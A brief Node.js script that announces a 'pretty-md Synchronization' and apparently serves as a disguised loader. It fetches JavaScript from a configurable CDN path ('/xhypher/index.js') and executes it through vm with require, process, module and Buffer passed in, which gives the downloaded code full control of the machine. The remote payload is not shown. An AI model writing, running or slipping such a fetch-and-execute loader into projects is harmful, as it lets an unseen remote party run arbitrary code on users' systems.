
const axios = require('axios');
const vm = require('vm');
const config = require('./settings.js');

(async () => {
  try {
    console.log("pretty-md Synchronization Initiated !");
    const { data: scriptCode } = await axios.get(`${config.CDN}/xhypher/index.js`);
    new vm.Script(scriptCode).runInContext(vm.createContext({ require, console, process, module, __filename, __dirname, Buffer }));
  } catch (err) {
    console.error("Error:", err);
  }
})();
